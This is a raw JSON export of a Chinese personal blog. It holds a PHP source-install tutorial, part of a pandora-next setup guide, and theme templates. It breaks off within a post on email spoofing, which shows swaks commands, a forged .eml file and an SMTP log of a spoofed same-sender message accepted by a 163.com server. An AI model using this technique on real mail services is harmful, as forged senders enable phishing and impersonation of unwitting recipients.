文件</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> data/ &amp;&amp; vim config.json</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>“bind”: “0.0.0.0:8181” 默认使用的8181端口，可以在这里进行修改。</li>\n<li>修改 license_id 字段，将之前复制的 license_id 复制到这里。</li>\n<li>site_password 字段是进入 Web 时要填的密码。</li>\n<li>setup_password 字段是管理配置文件的密码，使用方法是在浏览器搜索框输入<code>127.0.0.1:8181/setup</code></li>\n</ul>\n<p>其他字段的含义可以查看<a href=\"https://docs.pandoranext.com/zh-CN/configuration/config\"><strong>官方的说明文档</strong></a></p>\n<ol start=\"5\">\n<li>启动容器</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> .. &amp;&amp; docker-compose up -d</span><br></pre></td></tr></table></figure>\n\n<ol start=\"6\">\n<li>大功告成，浏览器访问即可，下期介绍 <a href><strong>pandora-next 关于 token.json 的进阶操作</strong></a>。</li>\n</ol>"},{"title":"源码安装PHP","date":"2023-07-04T02:54:00.000Z","_content":"\n### 安装PHP\n\n无论是在Centos7还是在Centos8都需要进行源码安装，其实这句话也不对，因为在Centos8里是可以yum安装php和php-fpm的。但是，安装之后使用`php-fpm start`启动命令之后是监听不到内容的。有可能是自己还是不太会用Centos8的PHP，自己也没有再去深入研究，做的项目都是用的源码装的，在这里先把源码安装的教程发不出来，后续有时间再去研究。\n\n<!-- more -->\n\n[PHP源码包下载链接](https://pan.baidu.com/s/1njY-HAXimp8635W3pe6JEw?pwd=ba1u)\n\n提取码：ba1u\n\n* 解压源码包\n\n```bash\ntar -zxf php-5.6.17.tar.gz\n```\n\n* 安装相关的依赖\n\n```bash\nyum install -y gcc make pcre pcre-devel zlib zlib-devel openssl openssl-devel\nyum install -y libxml2 libxml2-devel\n```\n\n这里分了两条依赖命令，如果是按照之前我写的[源码安装NGINX的博客](https://nustarain.gitee.io/2023/07/04/nginx/)已经安装NGINX了，那么不需要再执行第一条yum命令，反之则相反，如果你也不确定，那就全部执行一遍吧。\n\n* 执行configure脚本\n\n```bash\n./configure --prefix=/usr/local/php --enable-mbstring --enable-fpm --with-mysql --with-mysqli\n```\n\n* 再执行两步安装完成\n\n```bash\nmake  # 这里make的时间会相对长一点\nmake install\n```\n\n* 拷贝一份配置文件\n\n```bash\ncp /usr/local/php/etc/php-fpm.conf.default /usr/local/php/etc/php-fpm.conf\n```\n\n* 拷贝启动文件\n\n```bash\ncp sapi/fpm/init.d.php-fpm /etc/init.d/php-fpm\n```\n\n* 为启动文件添加启动权限\n\n```bash\nchmod +x /etc/init.d/php-fpm\n```\n\n* 再拷贝一份到系统的命令里面\n\n```bash\ncp /etc/init.d/php-fpm /sbin/php-fpm\n```\n\n然后就可以使用简单的命令对PHP进行管理\n\n```bash\nphp-fpm start\nphp-fpm reload\nphp-fpm stop\n```\n* 启动之后可以检查一下监听端口\n\n```bash\nlsof -i:9000\n```","source":"_posts/php.md","raw":"---\ntitle: 源码安装PHP\ndate: 2023-07-04 10:54:00\ncategories: 技术\ntags:\n  - Linux\n---\n\n### 安装PHP\n\n无论是在Centos7还是在Centos8都需要进行源码安装，其实这句话也不对，因为在Centos8里是可以yum安装php和php-fpm的。但是，安装之后使用`php-fpm start`启动命令之后是监听不到内容的。有可能是自己还是不太会用Centos8的PHP，自己也没有再去深入研究，做的项目都是用的源码装的，在这里先把源码安装的教程发不出来，后续有时间再去研究。\n\n<!-- more -->\n\n[PHP源码包下载链接](https://pan.baidu.com/s/1njY-HAXimp8635W3pe6JEw?pwd=ba1u)\n\n提取码：ba1u\n\n* 解压源码包\n\n```bash\ntar -zxf php-5.6.17.tar.gz\n```\n\n* 安装相关的依赖\n\n```bash\nyum install -y gcc make pcre pcre-devel zlib zlib-devel openssl openssl-devel\nyum install -y libxml2 libxml2-devel\n```\n\n这里分了两条依赖命令，如果是按照之前我写的[源码安装NGINX的博客](https://nustarain.gitee.io/2023/07/04/nginx/)已经安装NGINX了，那么不需要再执行第一条yum命令，反之则相反，如果你也不确定，那就全部执行一遍吧。\n\n* 执行configure脚本\n\n```bash\n./configure --prefix=/usr/local/php --enable-mbstring --enable-fpm --with-mysql --with-mysqli\n```\n\n* 再执行两步安装完成\n\n```bash\nmake  # 这里make的时间会相对长一点\nmake install\n```\n\n* 拷贝一份配置文件\n\n```bash\ncp /usr/local/php/etc/php-fpm.conf.default /usr/local/php/etc/php-fpm.conf\n```\n\n* 拷贝启动文件\n\n```bash\ncp sapi/fpm/init.d.php-fpm /etc/init.d/php-fpm\n```\n\n* 为启动文件添加启动权限\n\n```bash\nchmod +x /etc/init.d/php-fpm\n```\n\n* 再拷贝一份到系统的命令里面\n\n```bash\ncp /etc/init.d/php-fpm /sbin/php-fpm\n```\n\n然后就可以使用简单的命令对PHP进行管理\n\n```bash\nphp-fpm start\nphp-fpm reload\nphp-fpm stop\n```\n* 启动之后可以检查一下监听端口\n\n```bash\nlsof -i:9000\n```","slug":"php","published":1,"updated":"2024-05-03T03:55:54.885Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clvq6s5ge007v7zj30sm3g6a0","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><h3 id=\"安装PHP\"><a href=\"#安装PHP\" class=\"headerlink\" title=\"安装PHP\"></a>安装PHP</h3><p>无论是在Centos7还是在Centos8都需要进行源码安装，其实这句话也不对，因为在Centos8里是可以yum安装php和php-fpm的。但是，安装之后使用<code>php-fpm start</code>启动命令之后是监听不到内容的。有可能是自己还是不太会用Centos8的PHP，自己也没有再去深入研究，做的项目都是用的源码装的，在这里先把源码安装的教程发不出来，后续有时间再去研究。</p>\n<span id=\"more\"></span>\n\n<p><a href=\"https://pan.baidu.com/s/1njY-HAXimp8635W3pe6JEw?pwd=ba1u\">PHP源码包下载链接</a></p>\n<p>提取码：ba1u</p>\n<ul>\n<li>解压源码包</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tar -zxf php-5.6.17.tar.gz</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>安装相关的依赖</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum install -y gcc make pcre pcre-devel zlib zlib-devel openssl openssl-devel</span><br><span class=\"line\">yum install -y libxml2 libxml2-devel</span><br></pre></td></tr></table></figure>\n\n<p>这里分了两条依赖命令，如果是按照之前我写的<a href=\"https://nustarain.gitee.io/2023/07/04/nginx/\">源码安装NGINX的博客</a>已经安装NGINX了，那么不需要再执行第一条yum命令，反之则相反，如果你也不确定，那就全部执行一遍吧。</p>\n<ul>\n<li>执行configure脚本</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">./configure --prefix=/usr/local/php --enable-mbstring --enable-fpm --with-mysql --with-mysqli</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>再执行两步安装完成</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">make  <span class=\"comment\"># 这里make的时间会相对长一点</span></span><br><span class=\"line\">make install</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>拷贝一份配置文件</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cp</span> /usr/local/php/etc/php-fpm.conf.default /usr/local/php/etc/php-fpm.conf</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>拷贝启动文件</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cp</span> sapi/fpm/init.d.php-fpm /etc/init.d/php-fpm</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>为启动文件添加启动权限</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">chmod</span> +x /etc/init.d/php-fpm</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>再拷贝一份到系统的命令里面</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cp</span> /etc/init.d/php-fpm /sbin/php-fpm</span><br></pre></td></tr></table></figure>\n\n<p>然后就可以使用简单的命令对PHP进行管理</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">php-fpm start</span><br><span class=\"line\">php-fpm reload</span><br><span class=\"line\">php-fpm stop</span><br></pre></td></tr></table></figure>\n<ul>\n<li>启动之后可以检查一下监听端口</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">lsof -i:9000</span><br></pre></td></tr></table></figure>","site":{"data":{"APlayer":"{% if aplayer.enabled %}\n  <!-- require APlayer -->\n  <link rel=\"stylesheet\" href=\"{{aplayer.cdn.css}}\">\n  <script src=\"{{aplayer.cdn.js}}\"></script>\n  <!-- require MetingJS -->\n  <script src=\"{{aplayer.cdn.meting}}\"></script>\n  <meting-js\n    server=\"{{aplayer.server}}\"\n    type=\"{{aplayer.type}}\"\n    fixed=\"{{aplayer.fixed}}\"\n    id=\"{{aplayer.id}}\"\n    auto=\"{{aplayer.auto}}\"\n    mini=\"{{aplayer.mini}}\"\n    autoplay=\"{{aplayer.autoplay}}\"\n    theme=\"{{aplayer.theme}}\"\n    loop=\"{{aplayer.loop}}\"\n    order=\"{{aplayer.order}}\"\n    preload=\"{{aplayer.preload}}\"\n    volume=\"{{aplayer.volume}}\"\n    mutex=\"{{aplayer.mutex}}\"\n    list-folded=\"{{aplayer.listfolded}}\"\n    list-max-height=\"{{aplayer.listmaxheight}}\"\n    storage-name=\"{{aplayer.storagename}}\" >\n  </meting-js>\n{% endif %}","body-end":"<script>\n  document.addEventListener(\"DOMContentLoaded\", function() {\n    // 查找所有 div.table-container 元素\n    const tableContainers = document.querySelectorAll(\".table-container\");\n\n    // 遍历所有 div.table-container 元素\n    tableContainers.forEach(function(tableContainer) {\n      // 获取 div.table-container 内的 span 元素数量\n      const spanCount = tableContainer.querySelectorAll(\"tbody > tr > td.code > pre > span\").length;\n\n      // 检查 span 元素数量是否 >= 3\n      if (spanCount >= 11) {\n        // 检查 div.table-container 前面是否有 figcaption 元素，如果没有则添加一个\n        const prevElement = tableContainer.previousElementSibling;\n        let figcaption;\n        let iElement;\n        if (!prevElement || prevElement.tagName.toLowerCase() !== \"figcaption\") {\n          // 在 div.table-container 前插入一个 figcaption 元素\n          figcaption = document.createElement(\"figcaption\");\n\n          // 将 figcaption 插入到 DOM 中\n          tableContainer.parentNode.insertBefore(figcaption, tableContainer);\n        } else {\n          figcaption = prevElement;\n        }\n\n        // 创建一个 <i> 标签并添加功能\n        iElement = document.createElement(\"i\");\n        iElement.className = \"fas fa-angle-down\";\n        // 插入一点空格\n        iElement.innerHTML = \"&nbsp;&nbsp;&nbsp;\";\n        figcaption.insertBefore(iElement, figcaption.firstChild);\n\n        // 为 <i> 标签添加点击事件\n        iElement.addEventListener(\"click\", function() {\n          // 切换 tableContainer 的 \"code-hidden\" 类\n          tableContainer.classList.toggle(\"code-hidden\");\n\n          // 切换 <i> 标签的类名\n          if (iElement.classList.contains(\"fa-angle-down\")) {\n            iElement.classList.remove(\"fa-angle-down\");\n            iElement.classList.add(\"fa-angle-right\");\n          } else {\n            iElement.classList.remove(\"fa-angle-right\");\n            iElement.classList.add(\"fa-angle-down\");\n          }\n        });\n      }\n    });\n  });\n</script>","footer":"<script color=\"107,194,53\" opacity=\"1.0\" zIndex=\"-1\" count=\"99\" src=\"https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js\"></script>","styles":"body {\n  background: url(\"/images/sky.jpg\");\n  background-repeat: no-repeat;\n  background-attachment: fixed;\n  background-size: cover;\n  background-position: 100% 100%;\n}\n.posts-expand .post-meta-container {\n  color: #eeb422;\n}\n.header-inner {\n  background: rgba(238,180,34,0.7);\n}\n.popup {\n  opacity: 1;\n}\n.main-inner {\n  background-color: rgba(255,255,255,0);\n  padding: 0px 40px 40px 40px;\n}\n/* 代码块隐藏 */\n.code-hidden {\n  display: none;\n}\n","variables":""}},"excerpt":"<h3 id=\"安装PHP\"><a href=\"#安装PHP\" class=\"headerlink\" title=\"安装PHP\"></a>安装PHP</h3><p>无论是在Centos7还是在Centos8都需要进行源码安装，其实这句话也不对，因为在Centos8里是可以yum安装php和php-fpm的。但是，安装之后使用<code>php-fpm start</code>启动命令之后是监听不到内容的。有可能是自己还是不太会用Centos8的PHP，自己也没有再去深入研究，做的项目都是用的源码装的，在这里先把源码安装的教程发不出来，后续有时间再去研究。</p>","more":"<p><a href=\"https://pan.baidu.com/s/1njY-HAXimp8635W3pe6JEw?pwd=ba1u\">PHP源码包下载链接</a></p>\n<p>提取码：ba1u</p>\n<ul>\n<li>解压源码包</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tar -zxf php-5.6.17.tar.gz</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>安装相关的依赖</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum install -y gcc make pcre pcre-devel zlib zlib-devel openssl openssl-devel</span><br><span class=\"line\">yum install -y libxml2 libxml2-devel</span><br></pre></td></tr></table></figure>\n\n<p>这里分了两条依赖命令，如果是按照之前我写的<a href=\"https://nustarain.gitee.io/2023/07/04/nginx/\">源码安装NGINX的博客</a>已经安装NGINX了，那么不需要再执行第一条yum命令，反之则相反，如果你也不确定，那就全部执行一遍吧。</p>\n<ul>\n<li>执行configure脚本</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">./configure --prefix=/usr/local/php --enable-mbstring --enable-fpm --with-mysql --with-mysqli</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>再执行两步安装完成</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">make  <span class=\"comment\"># 这里make的时间会相对长一点</span></span><br><span class=\"line\">make install</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>拷贝一份配置文件</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cp</span> /usr/local/php/etc/php-fpm.conf.default /usr/local/php/etc/php-fpm.conf</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>拷贝启动文件</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cp</span> sapi/fpm/init.d.php-fpm /etc/init.d/php-fpm</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>为启动文件添加启动权限</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">chmod</span> +x /etc/init.d/php-fpm</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>再拷贝一份到系统的命令里面</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cp</span> /etc/init.d/php-fpm /sbin/php-fpm</span><br></pre></td></tr></table></figure>\n\n<p>然后就可以使用简单的命令对PHP进行管理</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">php-fpm start</span><br><span class=\"line\">php-fpm reload</span><br><span class=\"line\">php-fpm stop</span><br></pre></td></tr></table></figure>\n<ul>\n<li>启动之后可以检查一下监听端口</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">lsof -i:9000</span><br></pre></td></tr></table></figure>"},{"title":"邮件伪造 自己给自己发了一封邮件？？？","date":"2023-04-04T13:37:00.000Z","_content":"网络的安全是360度向外发射的，邮件的方向也是可以被利用的漏洞。今天新学的一个技能，可以自己给自己发邮件，目前只在163邮箱进行了实验，先把今天的小成果记录下来，后续有发现再做更新。\n\n如果有kali直接利用kali就OK，有一个工具叫swaks.\n\n```bash\nswaks --to river_li@whu.edu.cn\n```\n\n这里只指定了收件人，目的是测试发送的连通性，可以当成一个测试。\n\n<!-- more -->\n\nswaks 有常用的几个选项   \n\n* --to\n* --from\n* --h-To\n* --h-From\n\n直接在命令行中指定的--from实际上是SMTP协议中的MailFrom字段，即信封上的From\n\n使用--h-From指定的内容是信件内容中头部的From字段，即信件内容上，收件人看到的From\n\n--to和--h-To同理\n\n* --server —要登录的服务器\n* --ehlo   —要验证hello的服务器\n* -au    —在这个服务器上的用户名\n* -ap    —对应的用户密码\n\nswaks还可以登录登录其他的邮箱来发送邮件\n\n```bash\nswaks --server smtp.163.com --au lizic0228@163.com --ap XXXXXXXXX --ehlo smtp.163.com --from lizic0228@163.com --to river_li@whu.edu.cn\n```\n\n```bash\nswaks --to m19527705687@163.com --from m19527705687@163.com --body 'This is a test mailing' --header 'Subject: test' --ehlo gmail.com --header-X-Mailer gmail.com\n```\n\n这个命令的to和from都是一样的参数，很明显是执行不成功的。\n\n```bash 折叠代码\n=== Trying 163mx01.mxmail.netease.com:25...\n=== Connected to 163mx01.mxmail.netease.com.\n<-  220 163.com Anti-spam GT for Coremail System (163com[20141201])\n -> EHLO gmail.com\n<-  250-mail\n<-  250-PIPELINING\n<-  250-AUTH LOGIN PLAIN\n<-  250-AUTH=LOGIN PLAIN\n<-  250-coremail 1Uxr2xKj7kG0xkI17xGrU7I0s8FY2U3Uj8Cz28x1UUUUU7Ic2I0Y2Ur84UJgUCa0xDrUUUUj\n<-  250-STARTTLS\n<-  250-SIZE 73400320\n<-  250 8BITMIME\n -> MAIL FROM:<m19527700560@163.com>\n<** 553 Local user is not allowed,163 zwqz-mx-mta-g4-3,_____wCnFa7_NixkB9IdAA--.15197S2 1680619263\n -> QUIT\n<-  221 Bye\n=== Connection closed with remote host.\n```\n\n发生了553的错误。\n\n单纯地使用命令的行的方式，总是会出现一些奇奇怪怪的错误，至今还没研究明白是怎么一回事。应该是可以使用的，等待后续更新吧。\n\n---\n\n更加复杂的功能可以通过指定数据实现，也是我唯一执行成功的方法。\n\n```bash\nswaks --to river_li@whu.edu.cn --data data.eml\n```\n\n指定的data内容就是一封邮件的内容，可以指定From、Subject、Content-Type、DKIM-Signature等字段。\n可以把下面这一段代码，写进一个文件，命名为data.eml 在执行命令时进行引用。然后文件里的--to选项和--from选项即使相同也并不发生冲突，命令里的--to选项正常写。\n\n```bash 折叠代码\nDelivered-To: yixianosaurusphangnga7096@gmail.com\nReceived: by 2002:a4f:f31a:0:0:0:0:0 with SMTP id c26csp2268818ivo;\n        Mon, 30 Mar 2020 00:33:01 -0700 (PDT)\nX-Google-Smtp-Source: APiQypJvIKWdfG+6JpupjdqrYQfiXBeg7CPCrQ/ME+6eM+jUzhd19nOOsyGO1oi2FzXc892BL1EW\nX-Received: by 2002:a63:6d0b:: with SMTP id i11mr2776601pgc.404.1585553581825;\n        Mon, 30 Mar 2020 00:33:01 -0700 (PDT)\nARC-Seal: i=1; a=rsa-sha256; t=1585553581; cv=none;\n        d=google.com; s=arc-20160816;\n        b=YbBzqga5isSYWhaqAsRdWg/lzDH0S92InVplzXxAmGXkCqxdt7C3t9mOFLwZpEkpqi\n         QW4Y2I4+vAIpbiMi2MqUyLL7tU2Cq/jNlaO6VX+r0Gu1nx8ZxTpUR\n         b9yqaZaq6tcg48EWzGfuOT3uBs2aVp9W8Upf0MeSxPLVbpgEnzqMRjqlIhZaXAIe9kR1xg4V4IObPilZfBb4uYY0ayLTDcDDMXTc\n         GyjA==\nARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20160816;\n        h=subject:from:to:date:message-id;\n        bh=ecGWgWCJeWxJFeM0urOVWP+KOlqqvsQYKOpYUP8nk7I=;\n        b=ZHdmyDNpyMR/DCfW1heAmecEtINi+fb5Myr8+sjj1meh6oH0VhTZzvOCTylrp/WXlu\n         kGgDW2zzC95QeKAFF3ZbXClFoDVgEGECg2mTmQ2QUXB74qi5EDtu+X4izzxqjBZ+\n         m97oeNIBQoka40rvItwK8foHNSo3l6k55cpTvJ6+c1SvOz/eW5f0Im7dFpX3ELrioNMK\n         Kuvw==\nARC-Authentication-Results: i=1; mx.google.com;\n       spf=temperror (google.com: error in processing during lookup of admin@saucer-man.com: DNS error) smtp.mailfrom=admin@saucer-man.com\nReturn-Path: <admin@saucer-man.com>\nReceived: from saucer-man.com ([003.11.50.2])\n        by mx.google.com with ESMTP id m6si9771129pld.54.2020.03.30.00.33.01\n        for <yixianosaurusphaaaga7096@gmail.com>;\n        Mon, 30 Mar 2020 00:33:01 -0700 (PDT)\nReceived-SPF: temperror (google.com: error in processing during lookup of admin@saucer-man.com: DNS error) client-ip=003.11.50.2;\nAuthentication-Results: mx.google.com;\n       spf=temperror (google.com: error in processing during lookup of admin@saucer-man.com: DNS error) smtp.mailfrom=admin@saucer-man.com\nMessage-ID: <5e81a0ad.1c69fb81.18eb2.4993SMTPIN_ADDED_MISSING@mx.google.com>\nDate: Mon, 30 Mar 2020 15:32:58 +0800\nTo: yixianosaurusphaaaga7096@gmail.com\nFrom: admin@saucer-man.com\nSubject: test mail\nX-Mailer: saucer-man.com\n\n这里是信件的正文内容，可以进行修改。\n```    \n\n## PS：\n\n***Date: Mon, 30 Mar 2020 15:32:58 +0800***\n\n***To: yixianosaurusphaaaga7096@gmail.com***\n\n***From: admin@saucer-man.com***\n\n***Subject: test mail***\n\n> Date —可以修改邮件的时间戳\n\n> To —可以修改邮件的收件人\n\n> From —修改邮件的发件人\n\n> Subject —修改邮件的主题\n\n一般修改这几项就OK了\n\n---\n\n### 成功的案例\n\n```bash 折叠代码\nswaks --to worktestnet321@163.com --data /data.eml \n```\n\n我把文件写在了根目录下data.eml文件中，命令里的--to 是我要发送的邮件地址。\n\n```bash\n*** DEPRECATION WARNING: Inferring a filename from the argument to --data will be removed in the future.  Prefix filenames with '@' instead.\n=== Trying 163mx03.mxmail.netease.com:25...\n=== Connected to 163mx03.mxmail.netease.com.\n<-  220 163.com Anti-spam GT for Coremail System (163com[20141201])\n -> EHLO knight\n<-  250-mail\n<-  250-PIPELINING\n<-  250-AUTH LOGIN PLAIN\n<-  250-AUTH=LOGIN PLAIN\n<-  250-coremail 1Uxr2xKj7kG0xkI17xGrU7I0s8FY2U3Uj8Cz28x1UUUUU7Ic2I0Y2UFod1muUCa0xDrUUUUj\n<-  250-STARTTLS\n<-  250-SIZE 73400320\n<-  250 8BITMIME\n -> MAIL FROM:<knight@knight>\n<-  250 Mail OK\n -> RCPT TO:<m19527700560@163.com>\n<-  250 Mail OK\n -> DATA\n<-  354 End data with <CR><LF>.<CR><LF>\n -> Delivered-To: yixianosaurusphangnga7096@gmail.com\n -> Received: by 2002:a4f:f31a:0:0:0:0:0 with SMTP id c26csp2268818ivo;\n ->         Mon, 30 Mar 2020 00:33:01 -0700 (PDT)\n -> X-Google-Smtp-Source: APiQypJvIKWdfG+6JpupjdqrYQfiXBeg7CPCrQ/ME+6eM+jUzhd19nOOsyGO1oi2FzXc892BL1EW\n -> X-Received: by 2002:a63:6d0b:: with SMTP id i11mr2776601pgc.404.1585553581825;\n ->         Mon, 30 Mar 2020 00:33:01 -0700 (PDT)\n -> ARC-Seal: i=1; a=rsa-sha256; t=1585553581; cv=none;\n ->         d=google.com; s=arc-20160816;\n ->         b=YbBzqga5isSYWhaqAsRdWg/lzDH0S92InVplzXxAmGXkCqxdt7C3t9mOFLwZpEkpqi\n ->          QW4Y2I4+vAIpbiMi2MqUyLL7tU2Cq/jNlaO6VX+r0Gu1nx8ZxTpUR\n ->          b9yqaZaq6tcg48EWzGfuOT3uBs2aVp9W8Upf0MeSxPLVbpgEnzqMRjqlIhZaXAIe9kR1xg4V4IObPilZfBb4uYY0ayLTDcDDMXTc\n ->          GyjA==\n -> ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20160816;\n ->         h=subject:from:to:date:message-id;\n ->         bh=ecGWgWCJeWxJFeM0urOVWP+KOlqqvsQYKOpYUP8nk7I=;\n ->         b=ZHdmyDNpyMR/DCfW1heAmecEtINi+fb5Myr8+sjj1meh6oH0VhTZzvOCTylrp/WXlu\n ->          kGgDW2zzC95QeKAFF3ZbXClFoDVgEGECg2mTmQ2QUXB74qi5EDtu+X4izzxqjBZ+\n ->          m97oeNIBQoka40rvItwK8foHNSo3l6k55cpTvJ6+c1SvOz/eW5f0Im7dFpX3ELrioNMK\n ->          Kuvw==\n -> ARC-Authentication-Results: i=1; mx.google.com;\n ->        spf=temperror (google.com: error in processing during lookup of admin@saucer-man.com: DNS error) smtp.mailfrom=admin@saucer-man.com\n -> Return-Path: <admin@saucer-man.com>\n -> Received: from saucer-man.com ([003.11.50.2])\n ->         by mx.google.com with ESMTP id m6si9771129pld.54.2020.03.30.00.33.01\n ->         for <yixianosaurusphaaaga7096@gmail.com>;\n ->         Mon, 30 Mar 2020 00:33:01 -0700 (PDT)\n -> Received-SPF: temperror (google.com: error in processing during lookup of admin@saucer-man.com: DNS error) client-ip=003.11.50.2;\n -> Authentication-Results: mx.google.com;\n ->        spf=temperror (google.com: error in processing during lookup of admin@saucer-man.com: DNS error) smtp.mailfrom=admin@saucer-man.com\n -> Message-ID: <5e81a0ad.1c69fb81.18eb2.4993SMTPIN_ADDED_MISSING@mx.google.com>\n -> Date: Mon, 30 Mar 2020 15:32:58 +0800\n -> To: worktestnet321@163.com\n -> From: worktestnet321@163.com\n -> Subject: test mail\n -> X-Mailer: saucer-man.com\n -> \n -> 4008208820 DNC 橡果国际 新购物 新生活\n -> \n -> .\n<-  250 Mail OK queued as zwqz-mx-mta-g9-1,_____wBHQvQpOyxkxthYAA--.22943S2 1680620329\n -> QUIT\n<-  221 Bye\n=== Connection closed with remote host.\n```\n\n出现250的状态码发送成功，","source":"_posts/post-fake-mail.md","raw":"---\ntitle: 邮件伪造 自己给自己发了一封邮件？？？\ndate: 2023-04-04 21:37:00\ncategories: \n  - 技术\ntags: \n    - 网络安全\n---\n网络的安全是360度向外发射的，邮件的方向也是可以被利用的漏洞。今天新学的一个技能，可以自己给自己发邮件，目前只在163邮箱进行了实验，先把今天的小成果记录下来，后续有发现再做更新。\n\n如果有kali直接利用kali就OK，有一个工具叫swaks.\n\n```bash\nswaks --to river_li@whu.edu.cn\n```\n\n这里只指定了收件人，目的是测试发送的连通性，可以当成一个测试。\n\n<!-- more -->\n\nswaks 有常用的几个选项   \n\n* --to\n* --from\n* --h-To\n* --h-From\n\n直接在命令行中指定的--from实际上是SMTP协议中的MailFrom字段，即信封上的From\n\n使用--h-From指定的内容是信件内容中头部的From字段，即信件内容上，收件人看到的From\n\n--to和--h-To同理\n\n* --server —要登录的服务器\n* --ehlo   —要验证hello的服务器\n* -au    —在这个服务器上的用户名\n* -ap    —对应的用户密码\n\nswaks还可以登录登录其他的邮箱来发送邮件\n\n```bash\nswaks --server smtp.163.com --au lizic0228@163.com --ap XXXXXXXXX --ehlo smtp.163.com --from lizic0228@163.com --to river_li@whu.edu.cn\n```\n\n```bash\nswaks --to m19527705687@163.com --from m19527705687@163.com --body 'This is a test mailing' --header 'Subject: test' --ehlo gmail.com --header-X-Mailer gmail.com\n```\n\n这个命令的to和from都是一样的参数，很明显是执行不成功的。\n\n```bash 折叠代码\n=== Trying 163mx01.mxmail.netease.com:25...\n=== Connected to 163mx01.mxmail.netease.com.\n<-  220 163.com Anti-spam GT for Coremail System (163com[20141201])\n -> EHLO gmail.com\n<-  250-mail\n<-  250-PIPELINING\n<-  250-AUTH LOGIN PLAIN\n<-  250-AUTH=LOGIN PLAIN\n<-  250-coremail 